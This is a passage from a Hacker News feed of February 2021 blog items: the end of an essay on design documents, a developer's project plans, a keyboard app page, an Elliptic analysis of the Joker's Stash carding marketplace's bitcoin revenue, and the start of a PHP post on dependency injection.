filling the paper when it comes to describing the behavior of the API?</p><p>This writing block usually happens when you don‚Äôt know enough about the problem
that you are trying to solve. If you worked on the large project for a prolonged
period, your brain is most likely filled with details and problems surrounding that
project. If you were to write them down you could probably fill thick books,
nevertheless very few people are able to do that at the beginning of their project.
Their minds are as blurry as is their API design.</p><p>Essayist are writing their essays, because the act of writing helps
them to think and form their thoughts. They operate at the levels of thinking where
their brain can no longer process those thoughts, so they have to write them down before they
disappear in the cobwebs of their mind.</p><p>Everybody was staring into that direction, because they were standing on the so and so‚Äôs
shoulders. Lo and behold, we stared in the wrong direction and the only reason why that was discovered
was due to the ramblings of some essayist who was thinking through their writing.
That doesn‚Äôt mean that everybody who is forming their thoughts through writing
is worth reading about. Lots of writing finds its best use as a toilet paper,
so if reading these words induce some bowel movements you know what your next
steps should be.</p><p>I mostly see two reasons why larger projects demand writing a design document and other
kinds of paperwork bureaucracy. The first reason has educational purposes and
is there to produce some kind of guidance documentation that the rest of the team can rely on
during the actual development. It answers, or rather it should answer common questions and provide
general guidance on how to go about solving the problem.</p><p>Less discussed part of the secrets behind writing the design document is to
solve the same problem that the essayists discovered hundreds of years ago.
Sometimes the problems are so hard that they simply can‚Äôt be
solved only within your brain and you have to expand your brain power by offloading
the thinking process to paper.</p><p>When you start designing a new project, your mind is usually a spaghetti mess of questions.
What is the problem? Which technology should we use? When was the last time I ate?
What do the requirements say?
How are we supposed to deliver such and such performance?
Oh boy, this team is going to be pissed when I tell them to redesign their service.</p><p>The act of writing lets you discover problems that you didn‚Äôt think about
before, as you simply can‚Äôt fill 20 pages of coherent writing about the problem without
having a clear picture in your mind [1].</p><h2 id="but-they-are-always-outdated">But, they are always outdated</h2><p>The most common arguments that you may hear against writing the design documents
is that they are not going to capture all the details or they will go out
of date and become irrelevant. People won‚Äôt be reading them because they don‚Äôt have
the time or they don‚Äôt care enough about the topic and yadda yadda.</p><p>While those arguments might be true, they entirely miss the point and are simply
excuses for putting out a half baked undocumented project.
Unless you rely on formal verification or heavy quality assurance process like they do for space
projects, there will always be edge cases in your system that will only be found out in production.
The systems that are being developed these days are far too complex for one person
to envision all the possible edge cases beforehand.</p><p>Writing a design document before programming the complete implementation allows you to
avoid a much larger problem - marching in the wrong direction based on false
ideas. ‚ÄúWhoops that was dumb, let‚Äôs not do that anymore!‚Äù in a large team costs far
more than taking a few days/weeks off in order to think and write down your thoughts
beforehand.</p><p>Sure, some companies might take this into extremes and will demand a closet filled with
documentation when it comes to building a shed, because according to their processes
every project needs one. Well no, not every project needs one, but every project
will surely benefit from some additional thoughts and documentation.</p><p>Amazon went one step further and banned all Powerpoint presentations
in favor of writing lengthy full sentence documents. They argue that the
Powerpoint cabbages ones mind, and the truth is, most Powerpoint acolytes that
I‚Äôve seen had their minds made out of cabbage. Powerpoint makes it easy for a presenter
to just throw some bullet points on the screen and hand wave it through the
sloppily made presentation.
Trying to drill down more into the subject after such presentation is unlikely
to return a satisfactory answer, because they didn‚Äôt think it through [2].</p><p>The brain itself is a very lousy organ when it comes to retaining information
and it‚Äôs easy to overwhelm it with the amount of information that a hard
problem requires. When your memory runs low, swap your thoughts on paper.</p><h2 id="notes">Notes</h2><p>[1] Many books and articles were written, all describing the purpose of writing effectively.
One of my favorite videos on this topic is from Larry McEnerney:
<a href="https://www.youtube.com/watch?v=vtIzMaLkCaM">The Craft of Writing Effectively</a>.</p><p>[2] The problem lies in the messy hierarchy of bullet points. Big bullet points are stealing
the attention from smaller but sometimes equally important bullet points.
Edward Tufte wrote more about this problem in
<a href="https://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0001yB">PowerPoint Does Rocket Science</a>
post. The aftermath of space shuttle disintegration review was that the Powerpoint is an inappropriate
tool for engineering reports, presentations and documentation.</p></div></div>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/why-do-we-write-design-documents/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136422</guid>
            <pubDate>Sun, 14 Feb 2021 21:26:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What I'm Building in 2021]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136413">thread link</a>) | @kowsheek
<br/>
February 14, 2021 | https://blog.kowsheek.com/what-im-building-in-2021/ | <a href="https://web.archive.org/web/*/https://blog.kowsheek.com/what-im-building-in-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>After working as a consulting CTO for several years, I've returned to being much more hands-on in software development with about 80% of my working time spent in codebases.</p><p>It's been a refreshing and rewarding experience which made me wonder about why I had left being hands-on in the first place. After some introspection I realized that it was burnout and disenchantment from the "hustle" culture in the startup ecosystem. I was happy to have left the endless stream of ideas, pitching and building to helping others build their products.</p><p>After a <a href="https://blog.kowsheek.com/managing-chronic-pain-as-a-developer/">car accident</a>, some time off and serendipity, I started working at BRIO in 2019 where I was knee deep in the codebase. The product is extremely interesting and the development problems are challenging which has reignited my passion for building products.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/rp6_3UQLi2Y?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="brio">BRIO</h2><p><a href="http://briovr.com/">BRIO</a> is a platform for creating and delivering 3D, augmented reality &amp; virtual reality experience. Thousands of creators use BRIO to deliver millions of views to their beautiful and engaging experiences every month.</p><p>Continuing the build and grow the platform will be my primary focus for 2021 as my team and I reap the rewards of architectural decisions we made to evolve the codebase. I'm also looking forward to learning from the mistakes of our decisions so we can continue to improve and build better.</p><p>The product is frontend heavy and the codebase is end-to-end JavaScript with sprinklings of C++ &amp; Python. We've been aggressively transitioning to TypeScript while improving the core architecture in view of our long term aspirations. We are also using WebAssembly to deliver <a href="https://www.experience.briovr.com/solutions/ultra-render/">Ultra Render</a>, a GPU-powered path tracing engine that is deeply integrated with our ReactJS application.</p><figure><blockquote data-width="550">‚Äî Kowsheek (@ksqio) <a href="https://twitter.com/ksqio/status/1334962197324320768?ref_src=twsrc%5Etfw">December 4, 2020</a></blockquote>

</figure><p>In addition to continuing our efforts on the application, we have several services and related infrastructure changes we aim to release in 2021. We'll build most of these services using JavaScript, NodeJS and <a href="https://nestjs.com/">NestJS</a>.</p><h2 id="project-v">Project V</h2><p>As AngularJS was being sunset in 2016, I made the decision to build an enterprise SaaS product for one of my startups using the MEAN stack. Back then, AngularJS had a very healthy ecosystem that helped us ship several versions of the product rapidly. Unfortunately we didn't gain any significant traction and the product has since stagnated.</p><p>With the aim to experiment, I hope to revive the product by modernizing the codebase. My initial plans are to migrate to Angular and use NestJS alongside the existing Express application. </p><h2 id="project-l">Project L</h2><p>This is a platform to host third-party applications relating to the organization, utilization and workflow of different types of files. The project is in its inception and conceptualization phase so I have been researching and laying out the platform's architecture as requirements are developing.</p><p>While my go-to stack for building production solutions has been JavaScript, given the domain &amp; the long-term goals of this project, I am planning to build it with <a href="https://www.phoenixframework.org/">Phoenix</a>. I will likely use <a href="https://hexdocs.pm/phoenix_live_view/Phoenix.LiveView.html">LiveView</a> <a href="https://mindreframer.com/posts/js-bundling-with-instant-live-reload-for-phoenix-and-liveview/">set up with Vite and ReactJS</a>. The Elixir ecosystem is young but the technology and stack is amazing which will only continue expanding.</p><h2 id="project-z">Project Z</h2><p>An experimental productivity application that I had started to build with <a href="https://aws.amazon.com/amplify/">AWS Amplify</a>. After investigating Elixir for Project L, <a href="https://hexdocs.pm/absinthe/overview.html">Absinthe</a> and Phoenix emerged as a better solution for the functionalities I aimed to implement.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>Started to build a prototype in <a href="https://twitter.com/AWSAmplify?ref_src=twsrc%5Etfw">@AWSAmplify</a> but scrapped it to rebuild with <a href="https://twitter.com/elixirlang?ref_src=twsrc%5Etfw">@elixirlang</a>.</p><p>Reasoning: less servers, better for the environment.</p><p>Also OTP ü§©</p></div>‚Äî Kowsheek (@ksqio) <a href="https://twitter.com/ksqio/status/1360080668139671556?ref_src=twsrc%5Etfw">February 12, 2021</a></blockquote>

</figure><p>To improve my UI development skills am also diving deeper with the <a href="https://material.io/">Material</a> &amp; <a href="https://www.carbondesignsystem.com/">Carbon</a> design systems.</p><hr><p>JavaScript continues to be mainstay in the products I'm developing but Elixir will likely overtake its use towards the end of the year. I'll be sharing more details on these projects as they come alive in 2021 and beyond.</p><hr><p><a href="https://news.ycombinator.com/item?id=26136413">Join the Discussion on HackerNews</a></p>
                </div>
            </section>

                <section>
    <h3>Subscribe to blog.kowsheek</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.kowsheek.com/what-im-building-in-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136413</guid>
            <pubDate>Sun, 14 Feb 2021 21:24:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MessagEase ‚Äì The Smartest Touch Screen Keyboard]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26136338">thread link</a>) | @telotortium
<br/>
February 14, 2021 | http://www.exideas.com/ME/index.php | <a href="https://web.archive.org/web/*/http://www.exideas.com/ME/index.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        <p>
                        MessagEase&nbsp;is an innovative 
                        keyboard especially designed for touch screen devices.
                        Unlike the QWERTY keyboard, which was 
                        made for  ten fingers, MessagEase is 
                        optimized  for one or two fingers. 
                      </p><p>MessagEase has  fewer, larger keys, and a novel letter 
                          assignment, making texting  faster and more accurate. 
                      </p><p>A few minutes that you'll spend learning this new 
                      way of typing will save you hours of  agony. 
                      We have also created 
                      		<strong> 
                            <a href="https://play.google.com/store/apps/details?id=com.exideas.megame">
                            	MessagEase Game
                            </a></strong> 
                      
                      to help you learn MessagEase in a fun, 
                      entertaining way.
                      </p>
                        <p><a href="http://www.exideas.com/ME/me_faq.html">Learn More</a>
                  </p></div></div>]]>
            </description>
            <link>http://www.exideas.com/ME/index.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136338</guid>
            <pubDate>Sun, 14 Feb 2021 21:15:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One of the Most Prolific Cybercriminals Has Retired and May Be a Billionaire]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136276">thread link</a>) | @1cvmask
<br/>
February 14, 2021 | https://www.elliptic.co/blog/jokers-stash-retiring | <a href="https://web.archive.org/web/*/https://www.elliptic.co/blog/jokers-stash-retiring">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<figure>
<p><img src="https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=594&amp;height=310&amp;name=joker-stash-elliptic.png" alt="" width="594" height="310" srcset="https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=297&amp;height=155&amp;name=joker-stash-elliptic.png 297w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=594&amp;height=310&amp;name=joker-stash-elliptic.png 594w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=891&amp;height=465&amp;name=joker-stash-elliptic.png 891w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=1188&amp;height=620&amp;name=joker-stash-elliptic.png 1188w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=1485&amp;height=775&amp;name=joker-stash-elliptic.png 1485w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=1782&amp;height=930&amp;name=joker-stash-elliptic.png 1782w" sizes="(max-width: 594px) 100vw, 594px">
</p>
</figure>
<div>
<figure>
<img src="https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=65&amp;height=65&amp;name=ell-author-tom-robinson.jpg" alt="Dr. Tom Robinson" width="65" height="65" srcset="https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=33&amp;height=33&amp;name=ell-author-tom-robinson.jpg 33w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=65&amp;height=65&amp;name=ell-author-tom-robinson.jpg 65w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=98&amp;height=98&amp;name=ell-author-tom-robinson.jpg 98w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=130&amp;height=130&amp;name=ell-author-tom-robinson.jpg 130w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=163&amp;height=163&amp;name=ell-author-tom-robinson.jpg 163w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=195&amp;height=195&amp;name=ell-author-tom-robinson.jpg 195w" sizes="(max-width: 65px) 100vw, 65px">
</figure>
<div>


<h5>Elliptic's Co-founder and Chief Scientist discusses cryptocurrency forensics, investigations, compliance, and sanctions.</h5>
</div>
</div>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">
<p><strong>Hundreds of millions of cards have been stolen from online retailers, banks and payments companies before being sold for cryptocurrency on dozens of online marketplaces. According to Elliptic‚Äôs analysis, the founder of one of the most popular carding marketplaces, Joker‚Äôs Stash, has retired having amassed a fortune of over $1 billion.</strong></p>
<p>Every time you make a purchase with a credit or debit card, your card details are transmitted and stored in computer systems. Many of the major hacks of retailers and other companies are motivated by getting hold of these card credentials.</p>
<p>Stolen cards have value because they can be used to purchase high-value items or gift cards, which can then be resold for cash. This process is known as ‚Äúcarding‚Äù, and has become a key part of the cybercriminal‚Äôs playbook. Carding is very profitable in its own right, but it is also used to help launder and cash-out cryptocurrency obtained through other types of cybercrime.</p>

<p><strong>J</strong><strong>oker‚Äôs Stash - the King of Carding</strong></p>
<p>Over the past six years, Joker‚Äôs Stash rose to become the largest online seller of stolen credit cards and identity data. It is an example of a carding AVC (automated vending cart), which allows large volumes of cards to be sorted, filtered and purchased for Bitcoin with immediate delivery. In the image below you can see these cards categorised and searchable by country, bank, expiry date and other attributes. The going price for a single card on Joker‚Äôs Stash ranges from $1 to $150, with those at the upper end coming complete with the cardholder‚Äôs name, address and social security number.</p>
<!--more-->
<p><img src="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=512&amp;name=Jokers%20Stash%20Blog_1-1.png" alt="Jokers Stash Blog_1-1" width="512" srcset="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=256&amp;name=Jokers%20Stash%20Blog_1-1.png 256w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=512&amp;name=Jokers%20Stash%20Blog_1-1.png 512w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=768&amp;name=Jokers%20Stash%20Blog_1-1.png 768w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=1024&amp;name=Jokers%20Stash%20Blog_1-1.png 1024w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=1280&amp;name=Jokers%20Stash%20Blog_1-1.png 1280w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=1536&amp;name=Jokers%20Stash%20Blog_1-1.png 1536w" sizes="(max-width: 512px) 100vw, 512px"><span></span></p>
<p><span>A screenshot from Joker‚Äôs Stash, showing individual payment cards for sale together with details of the cardholder</span></p>
<p>Joker‚Äôs Stash began operations in 2014. Its founder announced the site‚Äôs launch in English and Russian-language posts on various carding forums, using the pseudonym ‚ÄúJokerStash‚Äù. The marketplace gained popularity due to the quality and volume of the cards offered, sourced from a network of ‚Äúpartners‚Äù - criminal groups that originally stole the card details.&nbsp; New batches of cards from major breaches of businesses were teased weeks in advance and given cryptic names. For example, two million cards <a href="https://gizmodo.com/2-million-credit-cards-exposed-after-hack-of-buca-di-be-1833710618"><span>belonging</span></a> to customers of US restaurant chain ‚ÄúBuca di Beppo‚Äù were marketed as the ‚ÄúDAVINCI BREACH‚Äù, while the five million cards making up the ‚ÄúBIGBADABOOM-2‚Äù batch likely <a href="https://www.nytimes.com/2018/04/01/technology/saks-lord-taylor-credit-cards.html"><span>originated</span></a> from retailer Saks Fifth Avenue.</p>

<p><strong>Using blockchain analytics to estimate sales volumes</strong></p>
<p>The revenues earned by Joker‚Äôs Stash can be estimated from the value of incoming cryptocurrency payments to its wallet, as seen on the blockchain. Since 2015 almost $400 million in bitcoin was sent to the marketplace, with annual sales peaking at $139 million in 2018. Sales dropped over the next two years, reflecting a broader downtrend in carding activity - increased security around card payments has made their theft more difficult, while advances in anti-fraud technology have made it more challenging for carders to make purchases with stolen cards.</p>
<p><img src="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=1200&amp;name=Jokers%20Stash%20Blog_2-1.png" alt="Jokers Stash Blog_2-1" width="1200" srcset="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=600&amp;name=Jokers%20Stash%20Blog_2-1.png 600w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=1200&amp;name=Jokers%20Stash%20Blog_2-1.png 1200w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=1800&amp;name=Jokers%20Stash%20Blog_2-1.png 1800w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=2400&amp;name=Jokers%20Stash%20Blog_2-1.png 2400w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=3000&amp;name=Jokers%20Stash%20Blog_2-1.png 3000w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=3600&amp;name=Jokers%20Stash%20Blog_2-1.png 3600w" sizes="(max-width: 1200px) 100vw, 1200px"><span>Value of Bitcoin payments received by Joker‚Äôs Stash, by year</span></p>
<p>This carding downturn may be one of the reasons that Joker‚Äôs Stash recently announced that it would be closing permanently. The marketplace has also faced other headwinds in recent months - JokerStash notified customers in October that he/she had been hospitalised for over a week with coronavirus, while in December Interpol and the FBI <a href="https://www.zdnet.com/article/fbi-interpol-disrupt-jokers-stash-the-internets-largest-carding-marketplace/"><span>announced</span></a> a coordinated seizure of domains used by the site. The servers themselves were apparently unaffected and the site remained operational through TOR mirrors (although some users suspect that the takedown was successful and that law enforcement now control the site - a tactic used with some darknet markets).</p>
<p><img src="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=600&amp;name=Jokers%20Stash%20Blog_4.png" alt="Jokers Stash Blog_4" width="600" srcset="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=300&amp;name=Jokers%20Stash%20Blog_4.png 300w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=600&amp;name=Jokers%20Stash%20Blog_4.png 600w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=900&amp;name=Jokers%20Stash%20Blog_4.png 900w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=1200&amp;name=Jokers%20Stash%20Blog_4.png 1200w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=1500&amp;name=Jokers%20Stash%20Blog_4.png 1500w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=1800&amp;name=Jokers%20Stash%20Blog_4.png 1800w" sizes="(max-width: 600px) 100vw, 600px"><span>Joker‚Äôs Stash announces its own closure</span></p>
<p>Another possible reason for the closure is simply that its founder has made so much money that it is no longer worth the effort and risk to continue operations, a sentiment suggested by the closure notice posted by JokerStash on the site:</p>
<p><img src="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=600&amp;name=Jokers%20Stash%20Blog_6.png" alt="Jokers Stash Blog_6" width="600" srcset="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=300&amp;name=Jokers%20Stash%20Blog_6.png 300w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=600&amp;name=Jokers%20Stash%20Blog_6.png 600w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=900&amp;name=Jokers%20Stash%20Blog_6.png 900w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=1200&amp;name=Jokers%20Stash%20Blog_6.png 1200w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=1500&amp;name=Jokers%20Stash%20Blog_6.png 1500w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=1800&amp;name=Jokers%20Stash%20Blog_6.png 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>

<p><strong>How large is Joker‚Äôs Bitcoin Stash?</strong></p>
<p>We can estimate JokerStash‚Äôs retirement fund by considering the fees charged by the marketplace. The first source of revenue is cryptocurrency deposit fees. Any cryptocurrency payments to the site are converted to a US dollar balance, calculated according to the prevailing exchange rate, minus a fee ranging from 8% in the early days of the site to 4% today. On top of that, the marketplace almost certainly takes a cut of all sales of cards provided by the site‚Äôs partners. The commission taken by Joker‚Äôs Stash is not known, but for similar marketplaces it ranges between 10 to 30%.</p>
<p>The other key piece of information to take into account is that according to cyber security firm <a href="https://geminiadvisory.io/jokers-stash-shuts-down/"><span>Gemini Advisory</span></a>, JokerStash claims to keep all proceeds of the marketplace in bitcoin. If that is the case then the recent bitcoin price increase would have substantially inflated the value of assets. If we assume an average total commission of 20% on sales, then considering bitcoin alone (the site also accepts Litecoin and Dash) they would have taken a total of at least 60,000 bitcoins - which today has a value of $2.5 billion.</p>

<p><strong>An opportunity for other carding markets to fill the void</strong></p>
<p>Joker‚Äôs Stash announced that it would cease operations on 15th February, although the site became inaccessible as of the 3rd February, angering many customers, who still had balances to spend. It is one of the few criminal marketplaces to shut down on its own terms, a victim of its own success rather than as a result of any apparent law enforcement operation. This will no doubt encourage others to take its place at the heart of the cybercrime economy.</p>

<p><strong>Related Articles</strong></p>
<ul>
<li><a href="https://www.reuters.com/article/crypto-currency-crime/darknet-crypto-kingpin-jokerstash-retires-after-illicit-1-billion-run-research-idUKL4N2KH2IW" rel="noopener">Reuters feature Elliptic research on the Darknet crypto kingpin JokerStash</a></li>
</ul>
<p>Learn more about how Elliptic helps crypto businesses and financial institutions<span>&nbsp;</span><a href="https://www.elliptic.co/what-we-do/aml-navigator" rel="noopener" target="_blank">manage their cryptoasset risk</a>.&nbsp;</p>
<p>Don‚Äôt have Elliptic backing up your crypto AML compliance operations already?</p>
<p><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-22b79504-3ecb-4028-ab2d-42c058ec8014"><span id="hs-cta-22b79504-3ecb-4028-ab2d-42c058ec8014"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/3883533/22b79504-3ecb-4028-ab2d-42c058ec8014" target="_blank"><img id="hs-cta-img-22b79504-3ecb-4028-ab2d-42c058ec8014" src="https://no-cache.hubspot.com/cta/default/3883533/22b79504-3ecb-4028-ab2d-42c058ec8014.png" alt="SCHEDULE A DEMO"></a></span></span><!-- end HubSpot Call-to-Action Code --></p></span>
</p>

</div>
</div></div>]]>
            </description>
            <link>https://www.elliptic.co/blog/jokers-stash-retiring</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136276</guid>
            <pubDate>Sun, 14 Feb 2021 21:08:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tree Coding vs. Bush Coding]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136224">thread link</a>) | @TomasVotruba2
<br/>
February 14, 2021 | https://tomasvotruba.com/blog/2021/02/11/tree-coding-vs-bush-coding/ | <a href="https://web.archive.org/web/*/https://tomasvotruba.com/blog/2021/02/11/tree-coding-vs-bush-coding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
            

            <ul>
    <li>
        <em></em>
        <strong>7 min</strong>
    </li>

    <li>
        <em></em>
        <time datetime="2021-02-Thu">
            
                                            Thu, Feb 11
            
                    </time>
    </li>

    
            <li>
            
            <a href="https://tomasvotruba.com/blog/2021/02/11/tree-coding-vs-bush-coding/#disqus_thread">X</a> comments
        </li>
    
    
            <li>
            <em></em>
            <a href="https://github.com/tomasvotruba/tomasvotruba.com/edit/master/packages/blog/data/2021/2021-02-11-tree-coding-vs-bush-coding.md">Found a typo? Edit me</a>
        </li>
    </ul>

            
            
            <div>
                <div>
                    <div><p>How does circular reference look like? It is a point where you wait for your doctor; they wait for a state to accept the vaccine, and the state waits on people like your to come to the doctor. <strong>Who has the responsibility?</strong> Who can change the state?
</p><p>
In the past, we used singletons and static calls to get anything anywhere instantly. But soon, we got into the circular references trap. Now <strong>we moved to dependency injection</strong> and this problem does not exist anymore... or does it?</p></div>
                </div>
            </div>

            <p>With dependency injection, dependencies grow naturally into the form of a tree:</p>
<pre><code>final class VaccineRepository
{
    public function __construct(
        private Connection $connection
    ) {
    }

    public function get(int $id): Vaccine
    {
        return $this-&gt;connection-&gt;getFromTable('vaccine', $id);
    }
}</code></pre>
<p>Then we use the repository inside a controller:</p>
<pre><code>final class DoctorController
{
    public function __construct(
        private VaccineRepository $vaccineRepository
    ) {
    }

    public function helpPerson(Person $person, int $vaccineId)
    {
        $vaccine = $this-&gt;vaccineRepository-&gt;get($vaccineId);
        $vaccine-&gt;injectInto($person);
        // ...
    }
}</code></pre>
<p>The dependency tree is clear and obvious:</p>
<ul>
<li><code>Controller</code> uses ‚Üì
<ul>
<li><code>Repository</code> uses ‚Üì
<ul>
<li><code>Connection</code> uses ‚Üì
<ul>
<li>PostgreSQL database uses ‚Üì
<ul>
<li>PostgreSQL Docker image</li>
</ul></li>
</ul></li>
</ul></li>
</ul></li>
</ul>

<h2 id="why-tree">Why Tree?</h2>
<p>The significant advantage of trees is that they grow strong and tall. They're robust and can produce a lot of branches and leaves to rise to the sun. The sun gives them more energy to grow even further. A typical example of tree coding is dependency injection.</p>
<p><img src="https://tomasvotruba.com/assets/images/posts/2021/tree_vs_bush.jpg"><br><em>Tree Coding vs Bush Coding</em>
</p>
<h2 id="why-bush">Why Bush?</h2>
<p>At first sight, a bush grows much faster than a tree. Its goal is to grow as many leaves as possible in a short time. It does not care about the future as much as a tree.
A typical example of bush coding is static method calls and static classes.</p>

<h2 id="power-of-tree-coding">Power of Tree Coding</h2>
<p>Tree coding is similar to <a href="https://tomasvotruba.com/blog/2018/04/30/programming-climbing-a-huge-mountain/">climbing a huge mountain</a>. Let's focus on the basic idea:</p>
<h3 id="what-is-the-goal-of-tree-coding">What is The Goal of Tree Coding?</h3>
<ul>
<li>It has a <strong>clear hierarchy</strong> from the bottom up, as you have guessed from dependency injection over static calls</li>
<li><strong>Single place for single responsibility</strong>
<ul>
<li>Need a new leaf? Put it on a branch with access to the Sun</li>
<li>Need a new branch? Put it next to another branch, where is enough space</li>
<li>Need a new tree trunk? Plant a new tree</li>
</ul></li>
<li><strong>It's intuitive</strong> - everybody knows putting a branch inside a leaf is a bad idea</li>
<li>It respects <strong><a href="https://softwareengineering.stackexchange.com/a/187462/148956">principle of least astonishment</a></strong></li>
</ul>
<p><a href="https://www.slideshare.net/GiovanniScerra/thoughtful-software-design">
<img src="https://tomasvotruba.com/assets/images/posts/2021/principal_of_least_astonishment.jpg">
</a></p>

<p>But bushes tend to spread faster, so it's only natural to assume they're already in your code. <strong>Slowly growing and waiting for their time to slow you down</strong>.</p>
<p><img src="https://tomasvotruba.com/assets/images/posts/2021/bushes_everywhere.jpg"></p><p>I have come around some bushes in my code before:</p>
<ul>
<li><a href="https://tomasvotruba.com/blog/2018/04/26/how-i-got-into-static-trap-and-made-fool-of-myself">How I Got into Static Trap and Made Fool of Myself</a></li>
<li><a href="https://tomasvotruba.com/blog/2019/04/01/removing-static-there-and-back-again">Removing Static - There and Back Again</a></li>
</ul>

<p>Today we look on 3 more examples that can be easily missed while slowly poluting your code:</p>
<h2 id="1-service-inside-value-object">1. Service Inside Value Object</h2>
<p>By value object, we talk about any entity, value object, or data transfer object. Anything that can be created multiple times, like vaccines.</p>
<pre><code>final class Vaccine
{
    public function __construct(
        private string $uuid,
        private float $volume
    ) {
    }

    public function getShotVolume(int $shotRank): float
    {
        // ...
    }
}</code></pre>
<p>How do we create a vaccine? Let's build a factory:</p>
<pre><code>$vaccineFactory = new VaccineFactory();
$vaccine = $vaccineFactory-&gt;create();</code></pre>
<p>Pretty straight-forward, right?</p>

<p>Later that year, there is a big pressure on pharmaceutical companies, so programmers are under huge pressure to deliver. The vaccine object is now a bit more powerful:</p>
<pre><code>$vaccine-&gt;orderNewOne();
$vaccine-&gt;vaccinateHuman($human);
$vaccine-&gt;vaccinateAnimal($animal);</code></pre>
